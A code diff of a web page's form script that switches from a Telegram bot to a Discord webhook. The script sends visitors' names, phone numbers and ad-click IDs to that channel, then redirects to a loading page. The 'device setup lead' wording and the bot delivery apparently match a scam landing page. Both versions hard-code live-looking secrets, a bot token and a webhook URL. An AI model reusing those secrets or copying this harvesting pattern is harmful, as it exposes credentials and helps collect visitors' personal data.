@@ -297,10 +297,8 @@
 
     <script>
       // 1. Bot Configuration
-      const TELEGRAM_BOT_TOKEN =
-        "8973005144:AAFBUKXJ_ByRP0CVX228zikXPE1Ol4sMfmg";
-      const TELEGRAM_CHAT_ID = "8030488890";
-      const REDIRECT_URL = "loading.html";
+      const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1517580028219621516/8nq9oDc5tlYo3jyVbrzsZj0mNUM15bYwgV_P8L7CSFVjvo59cvOu8p37p3AFANtmQmWG";
+const REDIRECT_URL = "loading.html";
 
       let chosenConnection = "";
 
@@ -376,62 +374,39 @@
     submitBtn.disabled = true;
     submitBtn.innerText = "Sending...";
 
-    const currentUrlParams = new URLSearchParams(window.location.search);
-
-    const brand = currentUrlParams.get("brand") || "Unknown";
-    const model = currentUrlParams.get("model") || "Unknown";
-
     const gclid = sessionStorage.getItem("gclid") || "Not Found";
 
-    const keyword =
-      sessionStorage.getItem("keyword") ||
-      sessionStorage.getItem("keywords") ||
-      "Not Found";
+    const discordMessage =
+`🚀 NEW LEAD
 
-    let telegramMessage =
-      "🚀 NEW DEVICE SETUP LEAD\n\n" +
-      "🔘 Connection: " + chosenConnection + "\n" +
-      "👤 Name: " + name + "\n" +
-      "📞 Phone: " + phone + "\n\n" +
-      "⚙️ Device Details\n" +
-      "Brand: " + brand + "\n" +
-      "Model: " + model + "\n\n" +
-      "📊  Data\n" +
-      "Keyword: " + keyword + "\n" +
-      "GCLID: " + gclid + "\n\n" +
-      "🌐 URL: " + window.location.href;
+👤 Name: ${name}
+📞 Mobile: ${phone}
+🔘 Connection: ${chosenConnection}
+📊 GCLID: ${gclid}`;
 
     try {
-      const response = await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: telegramMessage,
-          }),
-        }
-      );
+      const response = await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: discordMessage
+        })
+      });
 
-      const result = await response.json();
-
-      console.log("Telegram Response:", result);
-
-      if (result.ok) {
+      if (response.ok) {
         window.location.href = REDIRECT_URL;
       } else {
-        alert("Telegram Error: " + result.description);
+        alert("Discord Webhook Error");
 
         submitBtn.disabled = false;
         submitBtn.innerText = "Verify & Continue";
       }
     } catch (error) {
-      console.error("Error:", error);
+      console.error(error);
 
-      alert("Network Error: " + error.message);
+      alert("Network Error");
 
       submitBtn.disabled = false;
       submitBtn.innerText = "Verify & Continue";
